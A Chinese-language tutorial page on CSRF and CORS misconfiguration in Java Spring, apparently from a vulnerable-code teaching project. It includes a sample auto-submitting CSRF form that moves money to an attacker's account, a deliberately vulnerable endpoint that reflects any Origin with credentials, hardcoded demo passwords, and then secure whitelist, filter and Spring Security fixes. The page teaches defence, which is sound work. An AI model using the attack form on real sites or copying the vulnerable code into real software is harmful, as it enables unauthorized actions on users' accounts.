<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF（Cross-Site Request  Forgery）是一种网络安全漏洞，也被称为XSRF或Sea-Surf。这种攻击利用了用户当前已认证的会话来执行未经用户许可的操作。攻击者通过欺骗用户的浏览器，使其发送伪造的请求，以执行可能是恶意的操作，而用户并不知情。</p>
<p>攻击过程通常包括以下步骤：</p>
<ol>
<li><p>用户登录一个网站并获取了相应的认证令牌（比如，通过Cookie或其他方式）。</p>
<blockquote>
<p>用户使用其凭证（用户名和密码）登录银行应用程序。在登录成功后，服务器将颁发一个包含会话标识的Cookie，以便在之后的请求中进行身份验证。</p>
</blockquote>
</li>
<li><p>攻击者制作一个包含恶意请求的网页，并诱使用户访问。</p>
<blockquote>
<p>攻击者创建一个恶意网页，其中包含一个隐藏的表单，该表单会触发银行转账操作。</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;https://bank.com/transfer&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;toAccount&quot;</span> value=<span class="string">&quot;attackerAccount&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;amount&quot;</span> value=<span class="string">&quot;1000000&quot;</span> /&gt;</span><br><span class="line">        &lt;!-- CSRF Token is missing --&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="comment">// JavaScript to submit the form when the page loads</span></span><br><span class="line">        document.forms[<span class="number">0</span>].submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>攻击者通过各种手段诱导用户访问恶意网页，例如通过社交工程、恶意广告、或者通过发送包含恶意链接的电子邮件。</p>
</blockquote>
</li>
<li><p>用户在未察觉的情况下，浏览器会发送已认证的请求，因为浏览器会自动包含在用户登录时获取的认证令牌。</p>
<blockquote>
<p>用户在未察觉的情况下访问了恶意网页。由于用户已经登录了银行应用程序，浏览器会自动发送之前获取的银行Cookie，包括会话标识。</p>
<p>银行服务器接收到来自用户浏览器的请求，由于缺少Anti-CSRF Token，服务器无法判断该请求是否是合法的。服务器会处理请求，执行转账操作，因为它认为这是一个合法的、已经经过身份验证的请求。</p>
</blockquote>
</li>
<li><p>攻击者成功执行恶意操作，而用户毫不知情。</p>
<blockquote>
<p>由于服务器没有有效地验证请求的合法性，银行服务器会执行转账操作，将资金从用户账户转移到攻击者指定的账户（在这个例子中是attackerAccount）。</p>
</blockquote>
</li>
</ol>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/origin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">vuls1</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">origin</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;origin&quot;</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, origin); <span class="comment">// set origin from header</span></span><br><span class="line">    response.setHeader(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="string">&quot;true&quot;</span>);  <span class="comment">// allow cookie</span></span><br><span class="line">    <span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码存在一个安全漏洞，即未进行足够的验证就直接使用请求头中的 <code>origin</code> 设置了 <code>Access-Control-Allow-Origin</code> 头。这可能导致安全问题，尤其是在处理跨域资源共享（CORS）时，需要仔细验证请求的 <code>origin</code>。</p>
<p><strong>任意 <code>Origin</code> 头问题：</strong> 直接使用请求头中的 <code>origin</code> 设置 <code>Access-Control-Allow-Origin</code> 头，意味着你信任任何来源域，这可能导致安全风险。</p>
<p><strong>CSRF攻击：</strong> 如果攻击者能够伪造请求并设置任意 <code>Origin</code> 头，就有可能绕过浏览器的同源策略，向服务器发送未经授权的请求。</p>
<h3 id="安全代码-1"><a href="#安全代码-1" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/secure&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">secureEndpoint</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取请求头中的 Origin</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">origin</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Origin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证 Origin 是否在白名单中</span></span><br><span class="line">    <span class="keyword">if</span> (isValidOrigin(origin)) &#123;</span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, origin);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理非法请求，可以记录日志、抛出异常或者采取其他适当的措施</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid Request&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValidOrigin</span><span class="params">(String origin)</span> &#123;</span><br><span class="line">    <span class="comment">// 实现验证逻辑，检查 Origin 是否在白名单中</span></span><br><span class="line">    <span class="comment">// 可以使用白名单、正则表达式等进行验证</span></span><br><span class="line">    <span class="comment">// 返回 true 表示 Origin 在白名单中，允许访问；返回 false 表示非法 Origin，需要处理</span></span><br><span class="line">    <span class="comment">// 这里只是一个示例，实际情况根据具体需求进行实现</span></span><br><span class="line">    <span class="keyword">return</span> whitelist.contains(origin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Cors-checkOrigin"><a href="#Cors-checkOrigin" class="headerlink" title="Cors.checkOrigin"></a>Cors.checkOrigin</h4><ul>
<li>用注释配置允许的Origin域名</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 重写Cors的checkOrigin校验方法</span></span><br><span class="line"><span class="comment"> * 支持自定义checkOrigin，让其额外支持一级域名</span></span><br><span class="line"><span class="comment"> * 代码：org/joychou/security/CustomCorsProcessor</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/sec/crossOrigin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">secCrossOrigin</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em><strong>CustomCorsProcessor.java</strong></em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomCorsProcessor</span> <span class="keyword">extends</span> <span class="title class_">DefaultCorsProcessor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(CustomCorsProcessor.class);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 跨域请求，会通过此方法检测请求源是否被允许</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> config        CORS 配置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> requestOrigin 请求源</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果请求源被允许，返回请求源；否则返回 null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String <span class="title function_">checkOrigin</span><span class="params">(CorsConfiguration config, String requestOrigin)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// super -&gt; 支持checkOrigin原装的域名配置</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">super</span>.checkOrigin(config, requestOrigin);</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isBlank(requestOrigin)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//自定义Origin域名检测配置</span></span><br><span class="line">        <span class="keyword">return</span> customCheckOrigin(requestOrigin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自定义校验requestOrigin</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">customCheckOrigin</span><span class="params">(String requestOrigin)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( SecurityUtil.checkURL(requestOrigin) != <span class="literal">null</span>) &#123;</span><br><span class="line">            logger.info(<span class="string">&quot;[+] Origin: &quot;</span>  + requestOrigin );</span><br><span class="line">            <span class="keyword">return</span> requestOrigin;</span><br><span class="line">        &#125;</span><br><span class="line">        logger.error(<span class="string">&quot;[-] Origin: &quot;</span> + requestOrigin );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="spring-security"><a href="#spring-security" class="headerlink" title="spring security"></a>spring security</h4><p>利用spring security框架配置csrf防范策略。</p>
<p><em><strong>WebSecurityConfig.java</strong></em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.security;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> *;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Congifure csrf</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSecurityConfig</span> <span class="keyword">extends</span> <span class="title class_">WebSecurityConfigurerAdapter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;joychou.security.csrf.enabled&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Boolean</span> <span class="variable">csrfEnabled</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;joychou.security.csrf.exclude.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String[] csrfExcludeUrl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;joychou.no.need.login.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String[] noNeedLoginUrl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;joychou.security.csrf.method&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String[] csrfMethod = &#123;<span class="string">&quot;POST&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">RequestMatcher</span> <span class="variable">csrfRequestMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMatcher</span>() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">matches</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 配置需要CSRF校验的请求方式，</span></span><br><span class="line">            HashSet&lt;String&gt; allowedMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(Arrays.asList(csrfMethod));</span><br><span class="line">            <span class="comment">// return false表示不校验csrf</span></span><br><span class="line">            <span class="keyword">if</span> (!csrfEnabled) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> allowedMethods.contains(request.getMethod());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 默认token存在session里，用CookieCsrfTokenRepository改为token存在cookie里。</span></span><br><span class="line">        <span class="comment">// 但存在后端多台服务器情况，session不能同步的问题，所以一般使用cookie模式。</span></span><br><span class="line">        http.csrf()</span><br><span class="line">                .requireCsrfProtectionMatcher(csrfRequestMatcher)</span><br><span class="line">                .ignoringAntMatchers(csrfExcludeUrl)  <span class="comment">// 不进行csrf校验的uri，多个uri使用逗号分隔</span></span><br><span class="line">                .csrfTokenRepository(<span class="keyword">new</span> <span class="title class_">CookieCsrfTokenRepository</span>());</span><br><span class="line">        http.exceptionHandling().accessDeniedHandler(<span class="keyword">new</span> <span class="title class_">CsrfAccessDeniedHandler</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());</span></span><br><span class="line"></span><br><span class="line">        http.cors();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// spring security login settings</span></span><br><span class="line">        http.authorizeRequests()</span><br><span class="line">                .antMatchers(noNeedLoginUrl).permitAll() <span class="comment">// no need to login page</span></span><br><span class="line">                <span class="comment">// CVE-2022-22978漏洞代码</span></span><br><span class="line">                .regexMatchers(<span class="string">&quot;/black_path.*&quot;</span>).denyAll()    <span class="comment">// 如果正则匹配到/black_path，则forbidden</span></span><br><span class="line">                .anyRequest().authenticated().and() <span class="comment">// any request authenticated except above static resources</span></span><br><span class="line">                .formLogin().loginPage(<span class="string">&quot;/login&quot;</span>).permitAll() <span class="comment">// permit all to access /login page</span></span><br><span class="line">                .successHandler(<span class="keyword">new</span> <span class="title class_">LoginSuccessHandler</span>())</span><br><span class="line">                .failureHandler(<span class="keyword">new</span> <span class="title class_">LoginFailureHandler</span>()).and()</span><br><span class="line">                .logout().logoutUrl(<span class="string">&quot;/logout&quot;</span>).permitAll().and()</span><br><span class="line">                <span class="comment">// tomcat默认JSESSION会话有效时间为30分钟，所以30分钟不操作会话将过期。为了解决这一问题，引入rememberMe功能。</span></span><br><span class="line">                .rememberMe();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Global cors configure</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    CorsConfigurationSource <span class="title function_">corsConfigurationSource</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Set cors origin white list</span></span><br><span class="line">        ArrayList&lt;String&gt; allowOrigins = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        allowOrigins.add(<span class="string">&quot;joychou.org&quot;</span>);</span><br><span class="line">        allowOrigins.add(<span class="string">&quot;https://test.joychou.me&quot;</span>); <span class="comment">// 区分http和https，并且默认不会拦截同域请求。</span></span><br><span class="line"></span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorsConfiguration</span>();</span><br><span class="line">        configuration.setAllowedOrigins(allowOrigins);</span><br><span class="line">        configuration.setAllowCredentials(<span class="literal">true</span>);</span><br><span class="line">        configuration.setAllowedMethods(Arrays.asList(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>));</span><br><span class="line">        <span class="type">UrlBasedCorsConfigurationSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlBasedCorsConfigurationSource</span>();</span><br><span class="line">        source.registerCorsConfiguration(<span class="string">&quot;/cors/sec/httpCors&quot;</span>, configuration); <span class="comment">// ant style</span></span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureGlobal</span><span class="params">(AuthenticationManagerBuilder auth)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        auth</span><br><span class="line">                .inMemoryAuthentication()</span><br><span class="line">                .withUser(<span class="string">&quot;joychou&quot;</span>).password(<span class="string">&quot;joychou123&quot;</span>).roles(<span class="string">&quot;USER&quot;</span>).and()</span><br><span class="line">                .withUser(<span class="string">&quot;admin&quot;</span>).password(<span class="string">&quot;admin123&quot;</span>).roles(<span class="string">&quot;USER&quot;</span>, <span class="string">&quot;ADMIN&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CsrfAccessDeniedHandler</span> <span class="keyword">implements</span> <span class="title class_">AccessDeniedHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Logger logger= LoggerFactory.getLogger(<span class="built_in">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">                       AccessDeniedException accessDeniedException)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        logger.info(<span class="string">&quot;[-] URL: &quot;</span> + request.getRequestURL() + <span class="string">&quot;?&quot;</span> + request.getQueryString() + <span class="string">&quot;\t&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Referer: &quot;</span> + request.getHeader(<span class="string">&quot;referer&quot;</span>));</span><br><span class="line"></span><br><span class="line">        response.setContentType(MediaType.TEXT_HTML_VALUE); <span class="comment">// content-type: text/html</span></span><br><span class="line">        response.setStatus(HttpServletResponse.SC_FORBIDDEN); <span class="comment">// 403 forbidden</span></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;403 forbidden by JoyChou.&quot;</span>);  <span class="comment">// response contents</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p><em><strong>OriginFilter.java</strong></em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.filter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> *;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 推荐使用该全局方案修复Cors跨域漏洞，因为可以校验一级域名。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @ 2019.12.19</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;OriginFilter&quot;, urlPatterns = &quot;/cors/sec/originFilter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OriginFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(<span class="built_in">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) req;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) res;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">origin</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Origin&quot;</span>);</span><br><span class="line">        logger.info(<span class="string">&quot;[+] Origin: &quot;</span> + origin + <span class="string">&quot;\tCurrent url:&quot;</span> + request.getRequestURL());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 以file协议访问html，origin为字符串的null，所以依然会走安全check逻辑</span></span><br><span class="line">        <span class="keyword">if</span> (origin != <span class="literal">null</span> &amp;&amp; SecurityUtil.checkURL(origin) == <span class="literal">null</span>) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;[-] Origin check error. &quot;</span> + <span class="string">&quot;Origin: &quot;</span> + origin +</span><br><span class="line">                    <span class="string">&quot;\tCurrent url:&quot;</span> + request.getRequestURL());</span><br><span class="line">            response.setStatus(response.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().println(<span class="string">&quot;Invaid cors config by joychou.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, origin);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Methods&quot;</span>, <span class="string">&quot;GET, POST, OPTION&quot;</span>);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

